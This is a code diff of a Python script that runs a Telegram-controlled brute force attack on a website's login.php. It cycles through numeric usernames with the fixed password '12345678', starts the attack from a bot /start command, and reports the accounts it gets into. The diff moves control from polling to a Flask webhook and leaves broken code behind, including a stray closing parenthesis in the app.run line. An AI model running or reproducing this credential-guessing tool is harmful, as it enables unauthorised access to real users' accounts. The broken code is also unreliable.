@@ -6,8 +6,7 @@ from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 import logging
 import asyncio
-from flask import Flask
-import threading
+from flask import Flask, request
 
 # Enable logging
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
@@ -23,12 +22,11 @@ url = base_url + "/login.php"
 password = "12345678"
 
 # Function to perform the brute force attack
-username = 100106
-async def brute_force_attack(update, context):
+username = 100233
+async def brute_force_attack():
     global username
     while True:
         print(f"Trying username {username}...")
-        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Trying username {username}...")
         response = requests.get(url)
         soup = BeautifulSoup(response.content, 'html.parser')
         form = soup.find('form', {'class': 'login'})
@@ -64,34 +62,33 @@ async def show_logged_in(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def which(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logging.info(f"Received /which command from {update.effective_user.username}")
     await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Trying username {username}...")
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logging.info(f"Received /start command from {update.effective_user.username}")
     await context.bot.send_message(chat_id=update.effective_chat.id, text="Brute force attack started!")
-    asyncio.create_task(brute_force_attack(update, context))
+    # Start the brute force attack in a separate task
+    asyncio.create_task(brute_force_attack())
 
 # Flask app
 app = Flask(__name__)
 
-@app.route('/')
-def hello_world():
-    return 'Hello, World!'
-
-def run_flask_app():
-    app.run(host='0.0.0.0', port=10000)
+@app.route('/' + TOKEN, methods=['POST'])
+def webhook():
+    update = Update.de_json(request.json, None)
+    application.process_update(update)
+    return "ok"
 
 def main():
-    # Run Flask app in a separate thread
-    flask_thread = threading.Thread(target=run_flask_app)
-    flask_thread.daemon = True  # So that the thread dies when the main thread dies
-    flask_thread.start()
-
+    global application
     application = ApplicationBuilder().token(TOKEN).build()
 
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("show_logged_in", show_logged_in))
     application.add_handler(CommandHandler("which", which))
 
-    application.run_polling()
+    # Run Flask app
+    if __name__ == '__main__':
+        app.run(host='0.0.0.0', port=10000))
 
 if __name__ == '__main__':
     main()
